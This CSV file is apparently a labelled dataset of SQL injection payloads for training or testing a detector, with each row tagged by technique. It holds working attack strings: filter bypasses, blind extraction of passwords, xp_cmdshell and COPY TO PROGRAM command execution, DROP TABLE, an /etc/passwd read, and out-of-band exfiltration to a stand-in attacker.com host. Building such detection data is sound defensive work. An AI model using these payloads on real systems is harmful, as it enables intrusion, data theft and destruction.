Sentence,Label,Source,Type
"/*!50000UNION*//*!50000SELECT*/1,2,3--",1,CVE_ExploitDB,union_versioned_comment
"/*!UNION*//*!SELECT*/NULL,NULL--",1,CVE_ExploitDB,union_versioned_comment
1/*!UNION/*!ALL*/SELECT*/NULL--,1,CVE_ExploitDB,union_versioned_comment
"1+/*!UNION*/+/*!SELECT*/+NULL,NULL--",1,CVE_ExploitDB,union_versioned_comment
"1/**/UNION/**/SELECT/**/1,2,3--",1,CVE_ExploitDB,union_comment_bypass
"' UNION SELECT 0x61646d696e,0x61646d696e--",1,CVE_ExploitDB,union_hex
1 AND 0x61=0x61,1,CVE_ExploitDB,boolean_hex
' OR 0x313d31--,1,CVE_ExploitDB,boolean_hex
CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1',1,CVE_ExploitDB,char_encoding
"' UNION SELECT CHAR(65,68,77,73,78),NULL--",1,CVE_ExploitDB,union_char
'; EXEC xp_cmdshell('whoami')--,1,CVE_ExploitDB,mssql_rce
1; WAITFOR DELAY '0:0:5'--,1,CVE_ExploitDB,mssql_timebased
'; WAITFOR DELAY '00:00:05'--,1,CVE_ExploitDB,mssql_timebased
"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,CVE_ExploitDB,mssql_error
'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--,1,CVE_ExploitDB,mssql_dynamic
1;SELECT TOP 1 table_name FROM information_schema.tables--,1,CVE_ExploitDB,mssql_enum
"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",1,CVE_ExploitDB,mssql_union
' UNION SELECT NULL FROM dual--,1,CVE_ExploitDB,oracle_union
' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,1,CVE_ExploitDB,oracle_oob
1 AND ROWNUM=1 AND 1=1--,1,CVE_ExploitDB,oracle_boolean
"' UNION SELECT NULL,NULL FROM dual--",1,CVE_ExploitDB,oracle_union
' AND 1=(SELECT COUNT(*) FROM all_tables)--,1,CVE_ExploitDB,oracle_enum
'; SELECT PG_SLEEP(5)--,1,CVE_ExploitDB,pgsql_timebased
"' UNION SELECT NULL::text,NULL::text--",1,CVE_ExploitDB,pgsql_union
1;SELECT version()--,1,CVE_ExploitDB,pgsql_enum
' AND 1=(SELECT COUNT(*) FROM pg_tables)--,1,CVE_ExploitDB,pgsql_enum
'; COPY (SELECT '') TO PROGRAM 'id'--,1,CVE_ExploitDB,pgsql_rce
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",1,CVE_ExploitDB,error_extractvalue
"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",1,CVE_ExploitDB,error_updatexml
"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,CVE_ExploitDB,error_floor_rand
"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",1,CVE_ExploitDB,error_gtid
"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",1,CVE_ExploitDB,error_json
1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,1,CVE_ExploitDB,error_geometry
' AND EXP(~(SELECT * FROM (SELECT user())x))--,1,CVE_ExploitDB,error_exp
' AND SLEEP(5) AND '1'='1,1,CVE_ExploitDB,timebased_sleep
1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,1,CVE_ExploitDB,timebased_subquery
"' AND IF(1=1,SLEEP(5),0)--",1,CVE_ExploitDB,timebased_if
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,1,CVE_ExploitDB,timebased_if_mssql
1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,1,CVE_ExploitDB,timebased_nested
"' AND SUBSTRING(username,1,1)='a' AND '1'='1",1,CVE_ExploitDB,boolean_substring
"' AND ASCII(SUBSTR(username,1,1))>64--",1,CVE_ExploitDB,boolean_ascii
1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,1,CVE_ExploitDB,boolean_count
"' AND MID(version(),1,1)='5'--",1,CVE_ExploitDB,boolean_mid
"' AND BINARY SUBSTRING(password,1,1)='a'--",1,CVE_ExploitDB,boolean_binary
'		OR		1=1--,1,CVE_ExploitDB,whitespace_tab
"'
OR
1=1--",1,CVE_ExploitDB,whitespace_crlf
' OR/**/1=1--,1,CVE_ExploitDB,whitespace_comment
'/**/OR/**/1/**/=/**/1--,1,CVE_ExploitDB,whitespace_comment_heavy
"1%09UNION%09SELECT%091,2,3--",1,CVE_ExploitDB,tab_encoded
'; DROP TABLE users; --,1,CVE_ExploitDB,stacked_drop
"'; INSERT INTO users VALUES('hacker','pw')--",1,CVE_ExploitDB,stacked_insert
1'; UPDATE users SET password='hacked' WHERE '1'='1,1,CVE_ExploitDB,stacked_update
'; EXEC('SELECT 1')--,1,CVE_ExploitDB,stacked_exec
1; SELECT * FROM users--,1,CVE_ExploitDB,stacked_select
"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",1,CVE_ExploitDB,oob_dns
'; EXEC master..xp_dirtree '//attacker.com/a'--,1,CVE_ExploitDB,oob_mssql
"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",1,CVE_ExploitDB,oob_file_read
admin'--,1,CVE_ExploitDB,second_order
admin'/*,1,CVE_ExploitDB,second_order
1' AND '1'='1,1,CVE_ExploitDB,second_order
'; SELECT ',1,CVE_ExploitDB,second_order
' UNION SELECT NULL--,1,template,union_column_enum
"' UNION SELECT NULL,NULL--",1,template,union_column_enum
"' UNION SELECT NULL,NULL,NULL--",1,template,union_column_enum
"' UNION SELECT NULL,NULL,NULL,NULL--",1,template,union_column_enum
"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",1,template,union_column_enum
"' UNION ALL SELECT NULL,NULL--",1,template,union_column_enum
"1 UNION SELECT @@version,NULL--",1,template,union_column_enum
"1 UNION SELECT user(),database()--",1,template,union_column_enum
"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",1,template,union_column_enum
"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",1,template,union_column_enum
' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,1,template,blind_boolean_advanced
"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",1,template,blind_boolean_advanced
1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,1,template,blind_boolean_advanced
"' AND ORD(MID(password,1,1))>64 AND '1'='1",1,template,blind_boolean_advanced
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",1,template,blind_boolean_advanced
' oR '1'='1,1,template,filter_bypass
' Or '1'='1,1,template,filter_bypass
' OR/**/'1'='1,1,template,filter_bypass
' /*!OR*/ '1'='1,1,template,filter_bypass
' %4fR '1'='1,1,template,filter_bypass
' %6fR '1'='1,1,template,filter_bypass
"1 UN/**/ION SEL/**/ECT NULL,NULL--",1,template,filter_bypass
"1 /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--",1,template,filter_bypass
"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,template,error_fingerprint
"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",1,template,error_fingerprint
"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",1,template,error_fingerprint
"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--",1,template,error_fingerprint
